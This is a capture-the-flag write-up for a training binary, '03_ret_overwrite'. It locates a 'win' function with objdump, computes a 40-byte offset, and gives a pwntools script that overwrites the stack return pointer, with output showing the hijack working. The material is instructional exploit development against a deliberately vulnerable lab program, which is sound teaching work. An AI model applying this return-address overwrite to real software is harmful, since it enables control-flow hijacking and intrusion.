# 03_ret_overwrite Writeup

## Steps:
1. Run chall. Notice this is similar to 02 except we aim to overwrite the return pointer.
```
$ ./chall                                

Your goal is to modify the return pointer @ 0x7ffdb4c02078, to a function called 'win' in the binary.

A good tool to use is 'objdump'. Now is the time to learn more about it, if you don't!

0x7ffdb4c02050: 0x0000000000000000 0x0000000000000000 
0x7ffdb4c02060: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffdb4c02070: 0x0000000000000001 0x00007f829a7e5ca8 

Enter input: AAAA

0x7ffdb4c02050: 0x0000000a41414141 0x0000000000000000 
0x7ffdb4c02060: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffdb4c02070: 0x0000000000000001 0x00007f829a7e5ca8 

You failed to overwrite the return pointer.
```

2. Identify where `win` is using `objdump`
```
$ objdump -d chall
...
00000000004015c6 <win>:
  4015c6:       f3 0f 1e fa             endbr64
  4015ca:       55                      push   %rbp
  4015cb:       48 89 e5                mov    %rsp,%rbp
  4015ce:       48 8d 3d ab 0a 00 00    lea    0xaab(%rip),%rdi        # 402080 <_IO_stdin_used+0x80>
  4015d5:       e8 d6 fa ff ff          call   4010b0 <puts@plt>
  4015da:       bf 00 00 00 00          mov    $0x0,%edi
  4015df:       e8 1c fb ff ff          call   401100 <exit@plt>
...
```
3.  Determine the distance to the target variable ~ 5 sets of 8 bytes = `40` bytes
4.  Create the payload ~ 40 bytes of garbage to reach target variable then `0x004015c6` (address of `win`)
```
from pwn import *

target = process("./chall")
win = 0x004015c6

payload = b"A" * 40
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 153875
[+] Receiving all data: Done (715B)
[*] Process './chall' stopped with exit code 0 (pid 153875)

Your goal is to modify the return pointer @ 0x7ffd7944f0e8, to a function called 'win' in the binary.

A good tool to use is 'objdump'. Now is the time to learn more about it, if you don't!

0x7ffd7944f0c0: 0x0000000000000000 0x0000000000000000 
0x7ffd7944f0d0: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffd7944f0e0: 0x0000000000000001 0x00007fa829137ca8 

Enter input: 
0x7ffd7944f0c0: 0x4141414141414141 0x4141414141414141 
0x7ffd7944f0d0: 0x4141414141414141 0x4141414141414141 
0x7ffd7944f0e0: 0x4141414141414141 0x00000000004015c6 

Congrats, you successuly changed execution flow!
```
